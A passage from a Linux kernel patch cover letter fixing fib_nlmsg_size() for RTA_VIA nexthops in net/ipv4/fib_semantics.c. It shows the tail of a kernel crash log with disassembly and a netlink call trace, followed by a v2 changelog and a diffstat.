[   16.542081] Code: 74 01 75 2b 48 8b 7d 08 48 83 c4 30 89 da be 07 00 00 00 5b 5d 41 5c 41 5d 41 5e 41 5f e9 25 23 ee ff bb 97 ff ff ff eb cc 90 <0f> 0b 90 eb b7 e8 33 64 26 00 0f 1f 00 90 90 90 90 90 90 90 90 90
All code
========
   0:	74 01                	je     0x3
   2:	75 2b                	jne    0x2f
   4:	48 8b 7d 08          	mov    0x8(%rbp),%rdi
   8:	48 83 c4 30          	add    $0x30,%rsp
   c:	89 da                	mov    %ebx,%edx
   e:	be 07 00 00 00       	mov    $0x7,%esi
  13:	5b                   	pop    %rbx
  14:	5d                   	pop    %rbp
  15:	41 5c                	pop    %r12
  17:	41 5d                	pop    %r13
  19:	41 5e                	pop    %r14
  1b:	41 5f                	pop    %r15
  1d:	e9 25 23 ee ff       	jmp    0xffffffffffee2347
  22:	bb 97 ff ff ff       	mov    $0xffffff97,%ebx
  27:	eb cc                	jmp    0xfffffffffffffff5
  29:	90                   	nop
  2a:*	0f 0b                	ud2		<-- trapping instruction
  2c:	90                   	nop
  2d:	eb b7                	jmp    0xffffffffffffffe6
  2f:	e8 33 64 26 00       	call   0x266467
  34:	0f 1f 00             	nopl   (%rax)
  37:	90                   	nop
  38:	90                   	nop
  39:	90                   	nop
  3a:	90                   	nop
  3b:	90                   	nop
  3c:	90                   	nop
  3d:	90                   	nop
  3e:	90                   	nop
  3f:	90                   	nop

Code starting with the faulting instruction
===========================================
   0:	0f 0b                	ud2
   2:	90                   	nop
   3:	eb b7                	jmp    0xffffffffffffffbc
   5:	e8 33 64 26 00       	call   0x26643d
   a:	0f 1f 00             	nopl   (%rax)
   d:	90                   	nop
   e:	90                   	nop
   f:	90                   	nop
  10:	90                   	nop
  11:	90                   	nop
  12:	90                   	nop
  13:	90                   	nop
  14:	90                   	nop
  15:	90                   	nop
[   16.578115] RSP: 0018:ffff97d00034b8a0 EFLAGS: 00010246
[   16.587613] RAX: 00000000ffffffa6 RBX: 00000000ffffffa6 RCX: ffff97d00034b7fb
[   16.607035] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff9523038c53c0
[   16.623502] RBP: ffff97d00034ba48 R08: 0000000000000001 R09: ffff95230cf03eb0
[   16.637471] R10: ffffffffaa44dde0 R11: fefefefefefefeff R12: 0000000000000018
[   16.651794] R13: 00000000006433c6 R14: 00000000000000fe R15: 0000000000000001
[   16.668462]  fib_table_insert (net/ipv4/fib_trie.c:1380 (discriminator 1))
[   16.676737]  ? msi_set_affinity (arch/x86/kernel/apic/msi.c:37 (discriminator 1))
[   16.685448]  ? arch_stack_walk (arch/x86/kernel/stacktrace.c:26)
[   16.694306]  ? inet_rtm_newroute (net/ipv4/fib_frontend.c:931)
[   16.703497]  inet_rtm_newroute (net/ipv4/fib_frontend.c:931)
[   16.711734]  ? __pfx_inet_rtm_newroute (net/ipv4/fib_frontend.c:909)
[   16.722588]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7076)
[   16.732146]  ? __alloc_skb (net/core/skbuff.c:715)
[   16.742064]  ? ___slab_alloc (mm/slub.c:1080 mm/slub.c:4524)
[   16.750338]  ? avc_has_perm (include/linux/rcupdate.h:873 security/selinux/avc.c:1165 security/selinux/avc.c:1195)
[   16.758062]  ? __pfx_rtnetlink_rcv_msg (net/core/rtnetlink.c:4441)
[   16.767369]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
[   16.775953]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
[   16.784842]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
[   16.793403]  ____sys_sendmsg (net/socket.c:775 (discriminator 1) net/socket.c:790 (discriminator 1) net/socket.c:2684 (discriminator 1))
[   16.802407]  ___sys_sendmsg (net/socket.c:2738)
[   16.811522]  __sys_sendmsg (net/socket.c:2770)
[   16.819685]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
[   16.827525]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   16.838428] RIP: 0033:0x7fb9dd64efa3
[   16.845687] Code: 64 89 02 48 c7 c0 ff ff ff ff eb b7 66 2e 0f 1f 84 00 00 00 00 00 90 64 8b 04 25 18 00 00 00 85 c0 75 14 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 55 c3 0f 1f 40 00 48 83 ec 28 89 54 24 1c 48
All code
========
   0:	64 89 02             	mov    %eax,%fs:(%rdx)
   3:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   a:	eb b7                	jmp    0xffffffffffffffc3
   c:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  13:	00 00 00 
  16:	90                   	nop
  17:	64 8b 04 25 18 00 00 	mov    %fs:0x18,%eax
  1e:	00 
  1f:	85 c0                	test   %eax,%eax
  21:	75 14                	jne    0x37
  23:	b8 2e 00 00 00       	mov    $0x2e,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	77 55                	ja     0x87
  32:	c3                   	ret
  33:	0f 1f 40 00          	nopl   0x0(%rax)
  37:	48 83 ec 28          	sub    $0x28,%rsp
  3b:	89 54 24 1c          	mov    %edx,0x1c(%rsp)
  3f:	48                   	rex.W

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	77 55                	ja     0x5d
   8:	c3                   	ret
   9:	0f 1f 40 00          	nopl   0x0(%rax)
   d:	48 83 ec 28          	sub    $0x28,%rsp
  11:	89 54 24 1c          	mov    %edx,0x1c(%rsp)
  15:	48                   	rex.W
[   16.885977] RSP: 002b:00007ffd326672f8 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[   16.901413] RAX: ffffffffffffffda RBX: 00007ffd326673b0 RCX: 00007fb9dd64efa3
[   16.923341] RDX: 0000000000000000 RSI: 00007ffd32667330 RDI: 0000000000000003
[   16.941505] RBP: 0000000000000003 R08: 0000000000000008 R09: 0000000000000004
[   16.957758] R10: fffffffffffff61f R11: 0000000000000246 R12: 00005563c1d7c2a0
[   16.972912] R13: 00005563c1d7c2a0 R14: 00007ffd32669430 R15: 0000000000000003
[   16.988807]  </TASK>
[   16.994133] Kernel Offset: 0x27600000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
-----END crash log-----

Best regards,
Zihan Xi

changes in v2:
  - drop the unused rt_family argument from fib_nexthop_nlmsg_size()
  - remove the unreachable AF_INET6 else branch
  - swap the RTA_ENCAP and RTA_ENCAP_TYPE comments
  - use NLA_ALIGN(sizeof(struct rtnexthop)) to match nla_reserve_nohdr()
  - v1 Link: https://lore.kernel.org/all/cover.1785058094.git.zihanx@nebusec.ai/


Zihan Xi (1):
  ipv4: Fix fib_nlmsg_size() for RTA_VIA nexthops

 net/ipv4/fib_semantics.c | 67 +++++++++++++++++++++++++++++-----------
 1 file changed, 49 insertions(+), 18 deletions(-)

-- 
2.43.0

